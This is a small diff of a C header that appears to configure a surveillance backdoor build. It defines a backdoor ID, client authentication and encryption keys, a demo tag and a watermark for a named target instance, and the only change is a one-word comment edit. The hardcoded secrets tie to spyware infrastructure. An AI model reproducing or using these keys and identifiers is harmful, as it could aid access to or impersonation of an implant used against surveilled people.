@@ -6,7 +6,7 @@
 #ifdef _DEBUG_BINPATCH // istanza 'poveri' su castore.
 #define CLIENT_KEY			"4yeN5zu0+il3Jtcb5a1sBcAdjYFcsD9z"	// per server (auth)
 #define ENCRYPTION_KEY		"i6gMR84bxvQovzbhtV-if0SdPMu359ax"	// for log
-#define ENCRYPTION_KEY_CONF "uX-o0BOIkiyOyVXH4L3FYhbai-CvMU-_"	// for conf e sha1
+#define ENCRYPTION_KEY_CONF "uX-o0BOIkiyOyVXH4L3FYhbai-CvMU-_"	// for conf e sha12
 #define BACKDOOR_ID			"RCS_0000001167"					// castore "poveri"
 #define DEMO_TAG			"hxVtdxJ/Z8LvK3ULSnKRUmLE"
 #define WMARKER				"B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
